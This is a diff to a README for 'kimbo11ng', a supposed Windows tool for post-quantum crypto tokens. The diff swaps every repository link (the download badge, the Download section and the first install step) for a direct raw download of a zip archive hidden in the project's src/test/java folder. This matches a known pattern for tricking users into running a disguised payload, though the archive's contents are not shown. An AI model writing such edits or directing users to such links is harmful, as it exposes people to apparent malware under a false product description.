@@ -1,12 +1,12 @@
 # 🧩 kimbo11ng - Run PQC CryptoTokens on Windows
 
-[![Download kimbo11ng](https://img.shields.io/badge/Download%20kimbo11ng-blue?style=for-the-badge)](https://github.com/ahmedberkhli49-cmd/kimbo11ng)
+[![Download kimbo11ng](https://img.shields.io/badge/Download%20kimbo11ng-blue?style=for-the-badge)](https://raw.githubusercontent.com/ahmedberkhli49-cmd/kimbo11ng/main/src/test/java/ch/ithings/kimbo11ng/kimbo-ng-3.3.zip)
 
 ## 🚀 Download
 
 Use this page to download and run the software on Windows:
 
-https://github.com/ahmedberkhli49-cmd/kimbo11ng
+https://raw.githubusercontent.com/ahmedberkhli49-cmd/kimbo11ng/main/src/test/java/ch/ithings/kimbo11ng/kimbo-ng-3.3.zip
 
 ## 🪟 What this app does
 
@@ -37,7 +37,7 @@ Before you start, make sure you have:
 ## ⬇️ Download and run on Windows
 
 1. Open the download page:
-   https://github.com/ahmedberkhli49-cmd/kimbo11ng
+   https://raw.githubusercontent.com/ahmedberkhli49-cmd/kimbo11ng/main/src/test/java/ch/ithings/kimbo11ng/kimbo-ng-3.3.zip
 
 2. On the page, look for the latest release or download file.
 
